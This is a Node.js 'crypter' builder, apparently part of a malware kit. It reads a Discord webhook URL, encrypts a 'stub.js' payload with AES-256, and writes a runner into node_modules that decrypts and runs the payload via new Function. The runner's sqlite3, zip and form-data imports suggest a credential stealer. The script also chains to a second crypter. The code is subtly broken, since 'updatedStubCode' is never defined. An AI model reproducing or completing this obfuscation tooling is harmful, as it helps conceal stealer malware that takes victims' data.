const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { spawn } = require('child_process');
const axios = require('axios');

// Function to read the infos.json file
function readWebhookFromFile() {
  try {
    const jsonPath = path.resolve(__dirname, '../gui/info.json');
    const data = fs.readFileSync(jsonPath, 'utf8');
    const jsonData = JSON.parse(data);
    return jsonData.discordWebhookURL;
  } catch (error) {
    throw new Error(`Error reading webhook URL from file: ${error.message}`);
  }
}

const webhookURL = readWebhookFromFile();

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function executeSecondCrypterScript() {
  const crypterDirectory = __dirname;
  const secondCrypterScript = 'jscrypter.js';

  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });

  childProcess.on('error', (error) => {
    console.error(`Error executing the second crypter script: ${error.message}`);
  });

  childProcess.on('exit', (code, signal) => {
    if (code === 0) {
      console.log(``);
    } else {
      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
    }
  });
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('Success reset.');
}

async function main() {
  try {
    const stubPath = path.resolve(__dirname, 'stub.js');
    const stubCode = fs.readFileSync(stubPath, 'utf8');
    if (stubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const fetch = require('axios');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = 'node_modules';
    const fileName = 'input.js';
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);

    setTimeout(() => {
      resetPlaceholder(stubPath, stubCode);
      executeSecondCrypterScript();
    }, 1000);

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

main();
